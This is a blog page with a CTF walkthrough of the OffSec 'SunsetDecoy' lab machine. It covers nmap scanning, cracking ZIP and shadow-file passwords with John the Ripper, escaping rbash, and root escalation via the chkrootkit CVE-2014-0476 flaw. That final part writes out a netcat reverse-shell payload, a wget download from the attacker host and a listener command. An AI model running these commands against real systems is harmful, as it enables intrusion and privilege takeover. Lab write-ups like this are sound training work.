@@ -1,0 +1,906 @@
+<!doctype html>
+<html
+  lang="en-us" 
+  data-theme-mode="auto"
+  >
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  SunsetDecoy - Easy | D1as0x
+</title>
+<meta
+  name="description"
+  content="SunsetDecoy Walkthrough (OffSec - Easy)."
+/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"http://localhost:1313/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.css" />
+<meta property="og:type" content="website" />
+  <meta property="og:title" content="SunsetDecoy - Easy | D1as0x" />
+  <meta
+    property="og:description"
+    content="SunsetDecoy Walkthrough (OffSec - Easy)."
+  />
+  <meta property="og:url" content="http://localhost:1313/posts/offsec/sunsetdecoy/" />
+  <meta
+    property="og:site_name"
+    content="D1as0x"
+  />
+  <meta
+    property="og:image"
+    content="/sunsetDecoy/sunset.png"
+  />
+  <meta property="article:author" content="D1as0x" />
+  <meta property="article:published_time" content="2025-09-18T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2025-09-18T00:00:00&#43;00:00" /><meta property="article:tag" content="OffSecCTFEasy" /><meta name="twitter:card" content="summary" />
+  <meta name="twitter:image" content="/sunsetDecoy/sunset.png" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.css" />
+<link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.22/dist/katex.min.css"
+    integrity="sha384-5TcZemv2l/9On385z///&#43;d7MSYlvIEw9FuZTIdZ14vJLqWphw7e7ZPuOiCHJcFCP" crossorigin="anonymous"onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box"><div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script><div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="lang-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+This article does not have a corresponding language version
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav"><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'></div>
+        <a class="main-nav-link" href="/">Home</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'></div>
+        <a class="main-nav-link" href="/archives">Archives</a>
+      </span><span class="main-nav-link-wrap">
+        <div class='main-nav-icon icon rotate'></div>
+        <a class="main-nav-link" href="/about">About</a>
+      </span><a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav"></nav></div>
+<header id="header"><picture></picture>
+    <img  fetchpriority="high" src="/sunsetDecoy/sunset.png" alt="SunsetDecoy - Easy"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">SunsetDecoy - Easy</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          class="sidebar-left"
+            ><aside id="sidebar"><div class="sidebar-wrapper-container "><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-author">
+  <img
+    data-src="/avatar/Anime.jpeg"
+    data-sizes="auto"
+    alt="D1as0x"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">D1as0x</div>
+  <div class="sidebar-description">Offensive Security</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">1</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">3</div>
+  </a>
+</div>
+<div class="sidebar-social">
+  <div class="sidebar-social-icon">
+    <a href="https://app.hackthebox.com/profile/1985643" target="_blank" rel="noopener noreferrer" class="icon-htb">
+      <svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" id="Hackthebox--Streamline-Simple-Icons" height="20" width="20">
+        <path d="m22.5106 6.4566 0.0008 -0.0123a0.888 0.888 0 0 0 -0.2717 -0.6384c-0.0084 -0.0084 -0.018 -0.0155 -0.0267 -0.0235 -0.0186 -0.0166 -0.0371 -0.0333 -0.0572 -0.0484 -0.0193 -0.0147 -0.04 -0.0276 -0.0607 -0.0406 -0.0096 -0.006 -0.0182 -0.0131 -0.0281 -0.0188L12.4576 0.1266a0.891 0.891 0 0 0 -0.9223 0.0043L1.933 5.6744c-0.0107 0.0062 -0.0203 0.014 -0.0307 0.0205 -0.0073 0.0047 -0.015 0.008 -0.0223 0.0128 -0.007 0.0047 -0.013 0.0106 -0.02 0.0155a0.8769 0.8769 0 0 0 -0.147 0.1333l-0.0026 0.003a0.8872 0.8872 0 0 0 -0.2218 0.5847l0.0009 0.014c-0.0002 0.0088 -0.0015 0.0176 -0.0015 0.0264v11.0708c0 0.3277 0.1802 0.6288 0.469 0.7836l9.5986 5.5417c0.0076 0.0044 0.0158 0.0075 0.0236 0.0117a0.8754 0.8754 0 0 0 0.166 0.0687c0.0134 0.004 0.0266 0.0083 0.0401 0.0117a0.8793 0.8793 0 0 0 0.072 0.0142c0.0117 0.0019 0.0232 0.0045 0.0349 0.006a0.835 0.835 0 0 0 0.2157 0c0.0117 -0.0015 0.0232 -0.0041 0.0348 -0.006a0.9 0.9 0 0 0 0.072 -0.0142c0.0135 -0.0034 0.0267 -0.0077 0.04 -0.0117a0.895 0.895 0 0 0 0.0646 -0.0217 0.9134 0.9134 0 0 0 0.1015 -0.047c0.0078 -0.0042 0.016 -0.0072 0.0236 -0.0117l9.5986 -5.5417a0.8888 0.8888 0 0 0 0.469 -0.7836V6.4779c0 -0.0071 -0.0012 -0.0142 -0.0014 -0.0213zM5.2543 6.0822l6.5367 -3.774a0.4182 0.4182 0 0 1 0.4182 0l6.5366 3.774a0.4182 0.4182 0 0 1 0 0.7243l-6.5367 3.774a0.4182 0.4182 0 0 1 -0.4182 0l-6.5366 -3.774a0.4182 0.4182 0 0 1 0 -0.7243zm5.6134 14.3449a0.4172 0.4172 0 0 1 -0.626 0.3613L3.718 17.0218a0.4173 0.4173 0 0 1 -0.2086 -0.3613V9.1279a0.4172 0.4172 0 0 1 0.6258 -0.3613l6.524 3.7666a0.4172 0.4172 0 0 1 0.2086 0.3614v7.5325zm9.623 -3.7666a0.4173 0.4173 0 0 1 -0.2086 0.3613l-6.5239 3.7666a0.4172 0.4172 0 0 1 -0.6259 -0.3613v-7.5325c0 -0.149 0.0796 -0.2868 0.2087 -0.3614l6.5239 -3.7666a0.4172 0.4172 0 0 1 0.6258 0.3613v7.5326z" fill="#00ff00" stroke-width="1"></path>
+      </svg>
+    </a>
+  </div><div class="icon-discord sidebar-social-icon">
+      <a
+        href="https://discordapp.com/users/mth7848"
+        itemprop="url"
+        target="_blank"
+        aria-label="discord"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/D1as0x"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div><div class="icon-linkedin sidebar-social-icon">
+      <a
+        href="https://www.linkedin.com/in/matheusdiasmello/"
+        itemprop="url"
+        target="_blank"
+        aria-label="linkedin"
+        rel="noopener external nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="Home"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">Home</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="Archives"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">Archives</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="About"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'></div>
+      <div class="sidebar-menu-link">About</div>
+    </div></div>
+</div>
+  </div><div class="sidebar-widget"><div class="widget-wrapper">
+    <div
+      class="widget-wrap"
+      data-aos="fade-up"
+    >
+      <div style="display: flex; justify-content: space-between;">
+        <h3 class="widget-title">Categories</h3></div>
+      <div class="widget">
+        <ul class="category-list"><li class="category-list-item">
+                <a class="category-list-link" href="/categories/easy/"
+                  >Easy</a
+                >
+              </li><li class="category-list-item">
+                <a class="category-list-link" href="/categories/offsec/"
+                  >OffSec</a
+                >
+              </li></ul>
+      </div>
+    </div>
+  </div><div class="widget-wrapper">
+    <div
+      class="widget-wrap"
+      data-aos="fade-up"
+    >
+      <div style="display: flex; justify-content: space-between;">
+        <h3 class="widget-title">Tags</h3></div>
+      <div class="widget">
+        <ul class="tag-list" itemprop="keywords"><li class="tag-item">
+                <a
+                  class="tag-link"
+                  href="/tags/ctf/"
+                  aria-label="Tag: CTF"
+                >
+                  CTF
+                </a>
+              </li><li class="tag-item">
+                <a
+                  class="tag-link"
+                  href="/tags/easy/"
+                  aria-label="Tag: Easy"
+                >
+                  Easy
+                </a>
+              </li><li class="tag-item">
+                <a
+                  class="tag-link"
+                  href="/tags/offsec/"
+                  aria-label="Tag: OffSec"
+                >
+                  OffSec
+                </a>
+              </li></ul>
+      </div>
+    </div>
+  </div><div class="widget-wrapper">
+  <div
+    class="widget-wrap"
+    data-aos="fade-up"
+  >
+    <h3 class="widget-title">Tag Cloud</h3><div class="widget tagcloud"><a
+            style="font-size:20px"
+            href="/tags/ctf/"
+            aria-label="Tag: CTF"
+            >CTF</a
+          ><a
+            style="font-size:20px"
+            href="/tags/easy/"
+            aria-label="Tag: Easy"
+            >Easy</a
+          ><a
+            style="font-size:20px"
+            href="/tags/offsec/"
+            aria-label="Tag: OffSec"
+            >OffSec</a
+          ></div>
+  </div>
+</div><div class="widget-wrapper">
+    <div
+      class="widget-wrap"
+      data-aos="fade-up"
+    >
+      <h3 class="widget-title">Recent Posts</h3>
+      <div class="widget">
+        <ul><li>
+              <a href="/posts/offsec/sunsetdecoy/">SunsetDecoy - Easy</a>
+            </li></ul>
+      </div>
+    </div>
+  </div></div></div></aside>
+<section id="main"><article
+  class="h-entry article"
+  itemprop="blogPost"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2025-09-18 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2025-09-18</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2025-09-18</time
+    >
+  </span></div>
+<div class="article-category"><a
+      class="article-category-link"
+      href="/categories/offsec"
+      data-aos="zoom-in"
+      >OFFSEC</a
+    ><a
+      class="article-category-link"
+      href="/categories/easy"
+      data-aos="zoom-in"
+      >EASY</a
+    ></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody">
+<!-- cole isto no corpo do post (depois do front matter) -->
+
+<article class="writeup">
+  <header class="hero">
+    <div class="meta">
+      <h1>SunsetDecoy</h1>
+      <p class="subtitle">SunsetDecoy Walkthrough</p>
+      <div class="links">
+        <a href="/posts/offsec/" class="back">← Back to OffSec</a>
+      </div>
+    </div>
+    <figure class="cover">
+      <img src="/sunsetDecoy/sunset.png" alt="SunsetDecoy cover">
+    </figure>
+  </header>
+
+  <main class="content">
+    <section class="section">
+      <h2>Summary</h2>
+      <p>The SunsetDecoy machine is a web-based OffSec machine containing sensitive files protected by a password. We used John the Ripper and unshadow to find a valid user. After the first login in a restricted (rbash) shell, we bypassed the limitations and exploited the chrootkit vulnerability (CVE-2014-0476) to escalate privileges and gain root.</p>
+    </section>
+
+    <section class="section">
+      <h2>Enumeration</h2>
+      <p>A port scan was performed using Nmap, which revealed the open ports 22 (SSH) and 80 (HTTP):</p>
+
+      <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — nmap</span>
+        </div>
+
+        <pre class="term-body"><code>nmap -v -Pn -sV -sC -p- 192.168.243.85 --min-rate=300 -T4
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.38
+...
+</code></pre>
+      </div>
+
+      <p>Accessing port 80 (HTTP) revealed the file <code>save.zip</code>, which was subsequently downloaded for further analysis.:</p>
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917110228.png" alt="Download ZIP">
+      </figure>
+    </section>
+
+    <section class="section">
+      <h2>Cracking the ZIP Password with JohnTheRipper</h2>
+
+      <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — zip2john</span>
+        </div>
+        <pre class="term-body"><code>zip2john save.zip &gt; zip_hash.txt</code></pre>
+      </div>
+
+      <p>Running JohnTheRipper to crack the password from the extracted ZIP hash:</p>
+
+      <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — john</span>
+        </div>
+        <pre class="term-body"><code>john zip_hash.txt
+...
+manuel (save.zip)
+</code></pre>
+      </div>
+    </section>
+
+    <section class="section">
+      <h2>Extraction and Preparation of Password Files</h2>
+      <p>After extracting the ZIP contents, two important files were identified in the <code>/etc</code> directory:</p>
+
+      <ul>
+        <li><code>passwd</code></li>
+        <li><code>shadow</code></li>
+      </ul>
+
+      <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — /etc</span>
+        </div>
+        <pre class="term-body"><code>cd /etc
+...
+group  hash.txt  hostname  hosts  passwd  shadow  sudoers
+</code></pre>
+      </div>
+
+      <p>Using these files, the <code>unshadow</code> command was applied, which merges <code>passwd</code> and <code>shadow</code> into a single file compatible with JohnTheRipper, allowing the cracking of existing user passwords.</p>
+    
+          <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — unshadow </span>
+        </div>
+        <pre class="term-body"><code>unshadow passwd shadow > hash.txt</code></pre>
+      </div>
+      
+      <p>Using the file generated by <code>unshadow</code>, <code>john</code> was used to crack the users passwords.</p>
+
+    <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash — john </span>
+        </div>
+        <pre class="term-body"><code>john hash.txt
+...
+server  (296640a3b825115a47b68fc44501c828)</code></pre>
+      </div>      
+    </section>
+
+    <section class="section">
+      <h2>Initial Access</h2>
+      <p>After starting an SSH session with the user <code>296640a3b825115a47b68fc44501c828</code>, it was observed that the shell was running in restricted mode <code>rbash</code>. In this mode, Bash restricts certain commands, limiting full shell access.</p>
+
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917114117.png" alt="rbash restriction">
+      </figure>
+
+      <p>To bypass this restriction, online research was conducted, leading to a relevant GitHub post:</p>
+      <p><a href="https://gist.github.com/PSJoshi/04c0e239ac7b486efb3420db4086e290" target="_blank" rel="noopener noreferrer">gist.github.com/PSJoshi/... (escape rbash)</a></p>
+
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917114001.png" alt="Bypass restriction rbash">
+      </figure>
+
+      <p>After bypassing the restricted shell, the first flag was obtained.</p>
+
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917114729.png" alt="First flag">
+      </figure>
+    </section>
+
+    <section class="section">
+      <h2>Privilege Escalation</h2>
+
+      <p>While inspecting the `home` directory of user <code>296640a3b825115a47b68fc44501c828</code>, a script named <code>honeypot.decoy</code> was identified, which runs with root privileges.</p>
+      <p>After running the <code>honeypot.decoy</code> script several times using option <code>5</code>, the system's running processes were checked.</p>
+      
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917115517.png" alt="Script honeypot.decoy">
+      </figure>
+      
+      <p>By analyzing the running processes, it was possible to identify that <code>chkrootkit-0.49</code> is vulnerable to privilege escalation.</p>
+
+      <table class="exploit">
+        <thead><tr><th>CVE</th><th>Exploit</th></tr></thead>
+        <tbody>
+          <tr><td>CVE-2014-0476</td><td><a href="https://www.exploit-db.com/exploits/33899" target="_blank" rel="noopener noreferrer">exploit-db 33899</a></td></tr>
+        </tbody>
+      </table>
+
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917115408.png" alt="system processes">
+      </figure>
+
+      <p>To exploit the vulnerability, the exploit was transferred to the attacking machine and the following steps were performed:</p>
+      <ol>
+        <li>Rename the file to: <code>mv 33899.txt update</code></li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>mv 33899.txt update</code></pre>
+      </div>      
+        <li>Add a reverse shell to the attacking machine:</li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>echo '/usr/bin/nc 192.168.45.151 4142 -e /bin/bash' > update</code></pre>
+      </div>      
+        <li>Transfer the file to the target machine:</li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>wget http://192.168.45.151:8000/update</code></pre>
+      </div>      
+
+        <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917121957.png" alt="">
+      </figure>
+
+        <li>Grant execution permission to the file:</li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>chmod +x update</code></pre>
+      </div>
+        <li>Open a listening port on the attacking machine to receive the shell:</li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>nc -lnvp 4142</code></pre>
+      </div>
+      <li>Execute the honeypot.decoy file on the target machine:</li>
+         <div class="terminal">
+        <div class="term-bar">
+          <span class="lights">
+            <i class="dot red"></i>
+            <i class="dot yellow"></i>
+            <i class="dot green"></i>
+          </span>
+          <span class="term-title">bash ~</span>
+        </div>
+        <pre class="term-body"><code>./honeypot.decoy</code></pre>
+      </div>
+      
+       <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917122405.png" alt="">
+      </figure>
+      </ol>
+
+      <p>After establishing the reverse shell, the system was accessed with the necessary privileges and the final flag was retrieved.</p>
+
+      <figure class="screenshot">
+        <img src="/sunsetDecoy/pasted-image-20250917122542.png" alt="root flag">
+      </figure>
+    </section>
+  </main>
+</article>
+
+<style>
+/* Import font (vai carregar do Google Fonts).
+   Se preferir não depender de rede, troque por uma font local. */
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+
+:root{
+  --bg:#0b0b0b;
+  --card:#141414;
+  --muted:#a9a9a9;
+  --red:#ff3b3b;
+  --accent:#ff6b6b;
+  --text:#ececec;
+  --terminal-bg: linear-gradient(180deg,#071014,#0b0b0b);
+  --terminal-line:#0f1720;
+  --term-green:#78ff7a;
+}
+
+*{box-sizing:border-box}
+body{background:var(--bg); color:var(--text); font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,'Helvetica Neue',Arial; line-height:1.5}
+.writeup{max-width:1000px;margin:32px auto;padding:18px}
+.hero{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:center;margin-bottom:18px}
+.hero .meta h1{margin:0;color:var(--red);font-size:2rem}
+.hero .meta .subtitle{color:var(--muted);margin-top:8px}
+.hero .cover img{width:100%;height:220px;object-fit:cover;border-radius:10px;border:1px solid rgba(255,255,255,0.04);box-shadow:0 8px 30px rgba(255,0,0,0.06)}
+.back{display:inline-block;margin-top:10px;color:var(--muted);text-decoration:none;border:1px solid rgba(255,255,255,0.02);padding:6px 10px;border-radius:6px}
+.back:hover{color:var(--text);background:rgba(255,255,255,0.02)}
+
+/* Content */
+.content{background:transparent;padding:6px}
+.section{margin:22px 0;padding:18px;border-radius:10px;background:linear-gradient(180deg, rgba(255,0,0,0.01), rgba(0,0,0,0.02));border:1px solid rgba(255,59,59,0.04)}
+.section h2{color:var(--accent);margin-top:0}
+.section p, .section li{color:var(--text)}
+
+/* Terminal-like code box (macOS vibe) */
+.terminal{margin:16px 0;border-radius:10px;overflow:hidden;border:1px solid rgba(255,255,255,0.03);box-shadow:0 10px 30px rgba(0,0,0,0.6);background:var(--terminal-bg)}
+.term-bar{display:flex;align-items:center;gap:10px;padding:10px 12px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(0,0,0,0.05));border-bottom:1px solid rgba(255,255,255,0.02)}
+.lights{display:inline-flex;gap:8px;align-items:center}
+.dot{width:12px;height:12px;border-radius:50%;display:inline-block;box-shadow:0 2px 0 rgba(0,0,0,0.4)}
+.dot.red{background:#ff5f57}
+.dot.yellow{background:#ffbd2e}
+.dot.green{background:#28c840}
+.term-title{color:var(--muted);font-size:0.85rem;margin-left:6px}
+
+/* Terminal body */
+.term-body{margin:0;padding:18px 16px;overflow:auto;background:#02040a;color:var(--term-green);font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,'Liberation Mono','Courier New',monospace;font-size:13px;line-height:1.45}
+.term-body code{white-space:pre;display:block}
+
+/* Screenshot styling */
+.screenshot{margin:14px 0;text-align:center}
+.screenshot img{max-width:100%;border-radius:8px;border:1px solid rgba(255,255,255,0.03)}
+.screenshot figcaption{display:block;color:var(--muted);font-size:0.9rem;margin-top:8px}
+
+/* Tables and lists */
+table.exploit{width:100%;border-collapse:collapse;margin:12px 0}
+table.exploit th, table.exploit td{border:1px solid rgba(255,255,255,0.03);padding:8px;text-align:left;color:var(--text)}
+table.exploit th{background:rgba(255,59,59,0.06);color:var(--accent)}
+
+/* Footer meta */
+.post-footer{margin-top:28px;padding-top:12px;border-top:1px solid rgba(255,255,255,0.02)}
+.meta-small{color:var(--muted);font-size:0.9rem}
+
+/* Responsive */
+@media (max-width:900px){
+  .hero{grid-template-columns:1fr;grid-auto-rows:auto}
+  .hero .cover img{height:200px}
+  .writeup{padding:12px}
+}
+
+section code, p code {
+    background: rgba(255, 0, 0, 0.05); /* fundo leve para destacar */
+    color: #ff4c4c; /* vermelho mais vivo */
+    font-weight: 600; /* um pouco mais grosso */
+    padding: 2px 4px;
+    border-radius: 4px;
+    letter-spacing: 1.5px;
+}
+</style>
+</div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/offsec"
+        rel="tag"
+        >OFFSEC</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/easy"
+        rel="tag"
+        >EASY</a
+      >
+    </li></ul>
+</footer>
+  </div></article></section>
+        </div><footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+     
+      <span class="footer-info-sep "></span>
+      D1as0x
+    </div><div>
+        <span class="icon-brush"
+          >&nbsp;484</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;00:03</span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav">
+  <div class="sidebar-wrap"><div class="sidebar-author">
+  <img
+    data-src="/avatar/Anime.jpeg"
+    data-sizes="auto"
+    alt="D1as0x"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">D1as0x</div>
+  <div class="sidebar-description">Offensive Security</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div><div class="sidebar-state-number">1</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>Categories</div>
+    <div class="sidebar-state-number">
+      2
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>Tags</div>
+    <div class="sidebar-state-number">3</div>
+  </a>
+</div>
+<div class="sidebar-social">
+  <div class="sidebar-social-icon">
+    <a href="https://app.hackthebox.com/profile/1985643" target="_blank" rel="noopener noreferrer" class="icon-htb">
